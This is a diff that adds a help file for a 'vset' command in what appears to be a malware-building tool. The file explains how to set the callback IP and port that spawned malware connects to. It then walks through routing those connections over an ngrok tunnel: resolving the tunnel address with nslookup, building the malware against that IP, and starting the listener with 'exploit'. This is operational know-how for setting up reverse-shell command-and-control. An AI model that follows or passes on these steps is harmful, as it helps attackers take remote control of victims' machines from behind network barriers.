@@ -1,0 +1,32 @@
+set your ip and port, you can change it before and after spawning a malware
+
+usage:      IP         PORT 
+           ____       ______
+   vset  <your ip>  <ypur port>
+
+exapmle:    IP     PORT
+         _________ ____
+    vset 127.0.0.1 4444
+  
+    vset 10.0.0.44 8080
+ 
+
+warning: Do not use a DNS as an address before spawning a malware:
+    
+     do not use this :  vset localhost 4444 
+     use this        :  vset 127.0.0.1 4444
+           
+if you want to use ngrok, do this 
+
+start your ngrok, copy your address without the port, like ' tcp://4.tcp.ngrok.io ' only without the port 
+
+exapmle : ngrok tcp 4444
+
+then use nslookup to get the ip, like 34.34.34.34
+
+then use vset with the ip you've get by nslookup followed by the port in the ngrok address (Not 4444), then build the malware, after that, type this
+
+vset localhost followed by Your Port you have telled ngrok to redirect connection to it
+
+example: vset localhost 4444, then type exploit and voila.
+
